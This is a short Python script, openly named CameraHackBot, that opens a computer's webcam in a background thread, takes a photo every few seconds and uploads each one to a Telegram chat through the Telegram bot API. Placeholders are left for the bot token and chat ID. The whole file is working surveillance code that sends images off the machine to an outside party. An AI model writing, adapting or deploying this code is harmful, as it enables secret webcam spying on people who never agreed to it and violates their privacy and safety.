import cv2
import time
from threading import Thread
import requests

class CameraHackBot:
    def __init__(self, api_token: str, chat_id: str, interval: int = 10):
        self.api_token = api_token
        self.chat_id = chat_id
        self.interval = interval  # seconds between captures 
        self.running = False

    def start(self):
        if not self.running:
            self.running = True
            thread = Thread(target=self._capture_and_send, daemon=True)
            thread.start()
            print("[*] CameraHackBot started.")
        else:
            print("[!] CameraHackBot is already running.")

    def stop(self):
        self.running = False
        print("[*] CameraHackBot stopped.")

    def _capture_and_send(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[!] Cannot open camera.")
            return

        while self.running:
            ret, frame = cap.read()
            if not ret:
                print("[!] Failed to grab frame.")
                break

            _, buffer = cv2.imencode('.jpg', frame)
            img_bytes = buffer.tobytes()

            self._send_image(img_bytes)
            time.sleep(self.interval)

        cap.release()

    def _send_image(self, image_bytes):
        url = f"https://api.telegram.org/bot{self.api_token}/sendPhoto"
        files = {'photo': ('image.jpg', image_bytes)}
        data = {'chat_id': self.chat_id}

        try:
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print("[*] Image sent successfully.")
            else:
                print(f"[!] Failed to send image: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"[!] Exception sending image: {e}")


if __name__ == "__main__":
    # Replace with your bot token and chat ID before running
    BOT_TOKEN = 'YOUR_BOT_TOKEN'
    CHAT_ID = 'YOUR_CHAT_ID'

    bot = CameraHackBot(BOT_TOKEN, CHAT_ID)
    bot.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        bot.stop()
